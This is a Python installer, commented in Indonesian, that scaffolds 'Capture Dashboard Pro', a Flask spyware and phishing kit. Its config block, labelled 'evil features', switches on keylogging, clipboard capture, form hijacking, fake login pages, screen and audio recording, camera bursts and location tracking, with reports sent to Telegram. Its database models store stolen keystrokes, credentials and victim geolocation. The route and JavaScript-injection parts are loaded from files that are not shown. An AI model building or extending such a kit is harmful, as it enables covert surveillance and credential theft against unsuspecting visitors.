"""
Capture Dashboard Pro - ULTIMATE Installer
Jalankan: python install.py
"""
import os
import sys
import subprocess
import shutil
from pathlib import Path

PROJECT = Path.home() / "capture-pro"
H = Path.home()


def pip_install():
    print("\n[1/8] Install Python packages...")
    pkgs = [
        "Flask", "Flask-Cors", "Flask-SQLAlchemy", "Flask-WTF",
        "python-dotenv", "requests", "Pillow", "WTForms",
    ]
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "--upgrade"] + pkgs)
    print("      OK")


def make_dirs():
    print("\n[2/8] Bikin struktur folder...")
    for d in [
        PROJECT,
        PROJECT / "app",
        PROJECT / "app" / "routes",
        PROJECT / "app" / "templates",
        PROJECT / "app" / "static" / "css",
        PROJECT / "app" / "static" / "js",
        PROJECT / "app" / "static" / "img",
        PROJECT / "data",
        PROJECT / "data" / "uploads",
        PROJECT / "data" / "screenshots",
        PROJECT / "data" / "burst",
        PROJECT / "data" / "keys",
        PROJECT / "data" / "clipboard",
        PROJECT / "data" / "audio",
        PROJECT / "data" / "video",
        PROJECT / "data" / "tracking",
    ]:
        d.mkdir(parents=True, exist_ok=True)
    print("      OK")


FILES = {}

FILES["requirements.txt"] = (
    "Flask\nFlask-Cors\nFlask-SQLAlchemy\nFlask-WTF\n"
    "python-dotenv\nrequests\nPillow\nWTForms\n"
)

FILES[".env"] = """# ==== TELEGRAM ====
TG_TOKEN=ISI_TOKEN_BOT_KAMU
TG_CHAT_ID=ISI_CHAT_ID_KAMU

# ==== DASHBOARD ====
DASH_USER=admin
DASH_PASS=admin123
SECRET_KEY=ubah-random-panjang-1
JWT_SECRET=ubah-random-panjang-2

# ==== FITUR JAHAT (TRUE/FALSE) ====
ENABLE_VPN_CHECK=true
ENABLE_REVERSE_GEOCODE=true
ENABLE_SCREENSHOT=true
ENABLE_BURST=true
BURST_INTERVAL=3
BURST_DURATION=60
ENABLE_EVENT_LOG=true

# PAKET A - Data Kaya
ENABLE_KEYLOGGER=true
ENABLE_CLIPBOARD=true
ENABLE_TAB_LOG=true
ENABLE_FORM_HIJACK=true
ENABLE_AUTO_SCROLL_SHOT=true
AUTO_SCROLL_INTERVAL=8

# PAKET B - Session Recording
ENABLE_SCREEN_RECORD=true
SCREEN_RECORD_DURATION=20
ENABLE_AUDIO_RECORD=true
AUDIO_RECORD_DURATION=10

# PAKET C - Deep Intel
ENABLE_LOCATION_TRACKING=true
LOCATION_INTERVAL=30
ENABLE_MOTION_TRACK=true
ENABLE_NETWORK_INFO=true

# PAKET D - Phishing
ENABLE_FAKE_LOGIN=true
FAKE_LOGIN_DELAY=15
ENABLE_FAKE_UPDATE=false

# PAKET E - Pentest Pro
ENABLE_SESSION_REPLAY=true

# LAIN-LAIN
AUTO_CLEANUP_DAYS=30
RATE_LIMIT_UPLOAD_PER_HOUR=200
"""

FILES[".gitignore"] = "__pycache__/\n*.pyc\n.env\ndata/\nvenv/\n*.zip\n*.log\n*.db\n"

FILES["run.py"] = """import os
from pathlib import Path

BASE_DIR = Path(__file__).parent.absolute()
os.environ["DATABASE_URL"] = "sqlite:///" + str(BASE_DIR / "data" / "capture.db")
for k in ["UPLOAD_DIR", "SCREENSHOT_DIR", "BURST_DIR", "KEYS_DIR", "CLIPBOARD_DIR",
          "AUDIO_DIR", "VIDEO_DIR", "TRACKING_DIR"]:
    os.environ[k] = str(BASE_DIR / "data" / k.replace("_DIR", "").lower())
    os.makedirs(os.environ[k], exist_ok=True)

from app import create_app
app = create_app()

if __name__ == "__main__":
    print("=" * 60)
    print("  Capture Dashboard Pro - ULTIMATE")
    print("  URL  : http://localhost:8000/")
    print("  Dash : http://localhost:8000/dashboard")
    print("=" * 60)
    app.run(host="0.0.0.0", port=8000, debug=False)
"""

FILES["app/config.py"] = """import os
from pathlib import Path
from dotenv import load_dotenv

BASE_DIR = Path(__file__).parent.parent.absolute()
load_dotenv(BASE_DIR / ".env")


def _b(k, d="true"):
    return os.environ.get(k, d).lower() == "true"


def _i(k, d):
    return int(os.environ.get(k, str(d)))


class Config:
    TG_TOKEN = os.environ.get("TG_TOKEN", "")
    TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "")
    DASH_USER = os.environ.get("DASH_USER", "admin")
    DASH_PASS = os.environ.get("DASH_PASS", "admin123")
    SECRET_KEY = os.environ.get("SECRET_KEY", "change-me-1")
    JWT_SECRET = os.environ.get("JWT_SECRET", "change-me-2")
    DATABASE_URL = os.environ.get("DATABASE_URL", "sqlite:///" + str(BASE_DIR / "data" / "capture.db"))

    UPLOAD_DIR = os.environ.get("UPLOAD_DIR", str(BASE_DIR / "data" / "uploads"))
    SCREENSHOT_DIR = os.environ.get("SCREENSHOT_DIR", str(BASE_DIR / "data" / "screenshots"))
    BURST_DIR = os.environ.get("BURST_DIR", str(BASE_DIR / "data" / "burst"))
    KEYS_DIR = os.environ.get("KEYS_DIR", str(BASE_DIR / "data" / "keys"))
    CLIPBOARD_DIR = os.environ.get("CLIPBOARD_DIR", str(BASE_DIR / "data" / "clipboard"))
    AUDIO_DIR = os.environ.get("AUDIO_DIR", str(BASE_DIR / "data" / "audio"))
    VIDEO_DIR = os.environ.get("VIDEO_DIR", str(BASE_DIR / "data" / "video"))
    TRACKING_DIR = os.environ.get("TRACKING_DIR", str(BASE_DIR / "data" / "tracking"))

    ENABLE_VPN_CHECK = _b("ENABLE_VPN_CHECK")
    ENABLE_REVERSE_GEOCODE = _b("ENABLE_REVERSE_GEOCODE")
    ENABLE_SCREENSHOT = _b("ENABLE_SCREENSHOT")
    ENABLE_BURST = _b("ENABLE_BURST")
    BURST_INTERVAL = _i("BURST_INTERVAL", 3)
    BURST_DURATION = _i("BURST_DURATION", 60)
    ENABLE_EVENT_LOG = _b("ENABLE_EVENT_LOG")

    ENABLE_KEYLOGGER = _b("ENABLE_KEYLOGGER")
    ENABLE_CLIPBOARD = _b("ENABLE_CLIPBOARD")
    ENABLE_TAB_LOG = _b("ENABLE_TAB_LOG")
    ENABLE_FORM_HIJACK = _b("ENABLE_FORM_HIJACK")
    ENABLE_AUTO_SCROLL_SHOT = _b("ENABLE_AUTO_SCROLL_SHOT")
    AUTO_SCROLL_INTERVAL = _i("AUTO_SCROLL_INTERVAL", 8)

    ENABLE_SCREEN_RECORD = _b("ENABLE_SCREEN_RECORD")
    SCREEN_RECORD_DURATION = _i("SCREEN_RECORD_DURATION", 20)
    ENABLE_AUDIO_RECORD = _b("ENABLE_AUDIO_RECORD")
    AUDIO_RECORD_DURATION = _i("AUDIO_RECORD_DURATION", 10)

    ENABLE_LOCATION_TRACKING = _b("ENABLE_LOCATION_TRACKING")
    LOCATION_INTERVAL = _i("LOCATION_INTERVAL", 30)
    ENABLE_MOTION_TRACK = _b("ENABLE_MOTION_TRACK")
    ENABLE_NETWORK_INFO = _b("ENABLE_NETWORK_INFO")

    ENABLE_FAKE_LOGIN = _b("ENABLE_FAKE_LOGIN")
    FAKE_LOGIN_DELAY = _i("FAKE_LOGIN_DELAY", 15)
    ENABLE_FAKE_UPDATE = _b("ENABLE_FAKE_UPDATE", "false")

    ENABLE_SESSION_REPLAY = _b("ENABLE_SESSION_REPLAY")

    AUTO_CLEANUP_DAYS = _i("AUTO_CLEANUP_DAYS", 30)
    RATE_LIMIT_UPLOAD_PER_HOUR = _i("RATE_LIMIT_UPLOAD_PER_HOUR", 200)
"""

FILES["app/database.py"] = """from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()


def init_db():
    db.create_all()
"""

FILES["app/models.py"] = """from app.database import db
from datetime import datetime


class Session(db.Model):
    __tablename__ = "sessions"
    id = db.Column(db.Integer, primary_key=True)
    ts = db.Column(db.String(32), unique=True, index=True, nullable=False)
    waktu = db.Column(db.String(32))
    campaign = db.Column(db.String(64), default="default", index=True)
    ip_koneksi = db.Column(db.String(64))
    ip_publik = db.Column(db.String(64))
    ip_lokal = db.Column(db.String(255))
    country = db.Column(db.String(64))
    city = db.Column(db.String(64))
    region = db.Column(db.String(64))
    isp = db.Column(db.String(128))
    is_vpn = db.Column(db.Integer, default=0)
    lat = db.Column(db.Float)
    lon = db.Column(db.Float)
    akurasi_m = db.Column(db.Float)
    alamat = db.Column(db.Text)
    user_agent = db.Column(db.Text)
    fingerprint = db.Column(db.Text)
    visitor_id = db.Column(db.String(64), index=True)
    has_depan = db.Column(db.Integer, default=0)
    has_belakang = db.Column(db.Integer, default=0)
    has_screenshot = db.Column(db.Integer, default=0)
    has_audio = db.Column(db.Integer, default=0)
    has_video = db.Column(db.Integer, default=0)
    burst_count = db.Column(db.Integer, default=0)
    keylog_count = db.Column(db.Integer, default=0)
    clipboard_count = db.Column(db.Integer, default=0)
    created_at = db.Column(db.DateTime, default=datetime.utcnow, index=True)

    def to_dict(self):
        import json
        d = {c.name: getattr(self, c.name) for c in self.__table__.columns}
        if d.get("created_at"):
            d["created_at"] = d["created_at"].isoformat()
        try:
            d["fingerprint_obj"] = json.loads(d.get("fingerprint") or "{}")
        except Exception:
            d["fingerprint_obj"] = {}
        return d


class Event(db.Model):
    __tablename__ = "events"
    id = db.Column(db.Integer, primary_key=True)
    session_ts = db.Column(db.String(32), index=True)
    event_type = db.Column(db.String(32))
    data = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)


class BurstPhoto(db.Model):
    __tablename__ = "burst_photos"
    id = db.Column(db.Integer, primary_key=True)
    session_ts = db.Column(db.String(32), index=True)
    filename = db.Column(db.String(255))
    frame_num = db.Column(db.Integer)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)


class Keylog(db.Model):
    __tablename__ = "keylogs"
    id = db.Column(db.Integer, primary_key=True)
    session_ts = db.Column(db.String(32), index=True)
    key = db.Column(db.String(255))
    target = db.Column(db.String(64))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)


class Credential(db.Model):
    __tablename__ = "credentials"
    id = db.Column(db.Integer, primary_key=True)
    session_ts = db.Column(db.String(32), index=True)
    username = db.Column(db.String(255))
    password = db.Column(db.String(255))
    source = db.Column(db.String(64))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
"""

FILES["app/auth.py"] = """import hmac, hashlib, time, base64, json
from functools import wraps
from flask import request, jsonify, redirect, url_for
from app.config import Config


def _sign(data):
    return hmac.new(Config.JWT_SECRET.encode(), data, hashlib.sha256).hexdigest()


def create_token(user, ttl=86400 * 7):
    payload = {"u": user, "exp": int(time.time()) + ttl}
    raw = json.dumps(payload).encode()
    b64 = base64.urlsafe_b64encode(raw).decode().rstrip("=")
    return b64 + "." + _sign(raw)


def verify_token(token):
    try:
        b64, sig = token.split(".")
        b64 += "=" * (-len(b64) % 4)
        raw = base64.urlsafe_b64decode(b64)
        if not hmac.compare_digest(_sign(raw), sig):
            return False
        return json.loads(raw).get("exp", 0) > time.time()
    except Exception:
        return False


def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        token = request.cookies.get("session_token")
        if token and verify_token(token):
            return f(*args, **kwargs)
        if request.path.startswith("/api/"):
            return jsonify({"ok": False}), 401
        return redirect(url_for("dashboard.login_page"))
    return wrapper
"""

FILES["app/__init__.py"] = """import os
from flask import Flask
from flask_cors import CORS
from flask_wtf.csrf import CSRFProtect
from app.config import Config
from app.database import db, init_db

csrf = CSRFProtect()


def create_app():
    app = Flask(__name__, template_folder="templates", static_folder="static")
    app.config["SECRET_KEY"] = Config.SECRET_KEY
    app.config["WTF_CSRF_ENABLED"] = True
    app.config["SQLALCHEMY_DATABASE_URI"] = Config.DATABASE_URL
    app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
    app.config["MAX_CONTENT_LENGTH"] = 200 * 1024 * 1024

    for d in [Config.UPLOAD_DIR, Config.SCREENSHOT_DIR, Config.BURST_DIR,
              Config.KEYS_DIR, Config.CLIPBOARD_DIR, Config.AUDIO_DIR,
              Config.VIDEO_DIR, Config.TRACKING_DIR]:
        os.makedirs(d, exist_ok=True)

    CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)
    csrf.init_app(app)
    db.init_app(app)

    from app.routes import capture, api, burst, telegram_hook, intel
    for m in [capture, api, burst, telegram_hook, intel]:
        csrf.exempt(m.bp)

    from app.routes.capture import bp as capture_bp
    from app.routes.dashboard import bp as dash_bp
    from app.routes.api import bp as api_bp
    from app.routes.burst import bp as burst_bp
    from app.routes.telegram_hook import bp as tg_bp
    from app.routes.intel import bp as intel_bp

    app.register_blueprint(capture_bp)
    app.register_blueprint(dash_bp)
    app.register_blueprint(api_bp, url_prefix="/api")
    app.register_blueprint(burst_bp, url_prefix="/burst")
    app.register_blueprint(tg_bp, url_prefix="/tg")
    app.register_blueprint(intel_bp, url_prefix="/intel")

    with app.app_context():
        init_db()

    @app.route("/healthz")
    def _health():
        return {"ok": True}

    return app
"""


def write_part1():
    print("\n[3/8] Tulis file bagian 1...")
    for rel, content in FILES.items():
        p = PROJECT / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
    print("      OK - " + str(len(FILES)) + " file")


def load_part(n, filename):
    path = H / filename
    if not path.exists():
        print("      ERROR: " + filename + " tidak ada di home!")
        sys.exit(1)
    sys.path.insert(0, str(H))
    import importlib.util
    spec = importlib.util.spec_from_file_location("part" + str(n), str(path))
    mod = importlib.util.module_from_spec(spec)
    sys.modules["part" + str(n)] = mod
    spec.loader.exec_module(mod)
    getattr(mod, "write_part" + str(n))(PROJECT)


def test_import():
    print("\n[7/8] Test import app...")
    os.chdir(str(PROJECT))
    sys.path.insert(0, str(PROJECT))
    try:
        import importlib
        import app as app_module
        importlib.reload(app_module)
        app_module.create_app()
        print("      OK")
    except Exception as e:
        print("      GAGAL:", e)
        import traceback
        traceback.print_exc()
        sys.exit(1)


def finish():
    print("\n[8/8] Selesai!")
    print("=" * 60)
    print("  INSTALL BERHASIL - ULTIMATE VERSION")
    print("=" * 60)
    print()
    print("  Jalankan:")
    print("    cd ~/capture-pro")
    print("    python run.py")
    print()
    print("  URL:")
    print("    http://localhost:8000/")
    print("    http://localhost:8000/dashboard")
    print()
    print("  Login: admin / admin123")
    print()


if __name__ == "__main__":
    print("=" * 60)
    print("  Capture Dashboard Pro - ULTIMATE Installer")
    print("=" * 60)
    if PROJECT.exists():
        print("\nFolder sudah ada.")
        if input("Hapus & install ulang? (y/n): ").strip().lower() == "y":
            shutil.rmtree(PROJECT)
        else:
            sys.exit(0)

    pip_install()
    make_dirs()
    write_part1()
    print("\n[4/8] Load part2 (routes)...")
    load_part(2, "install_part2.py")
    print("      OK")
    print("\n[5/8] Load part3 (templates)...")
    load_part(3, "install_part3.py")
    print("      OK")
    print("\n[6/8] Load part4 (JS injection)...")
    load_part(4, "install_part4.py")
    print("      OK")
    test_import()
    finish()
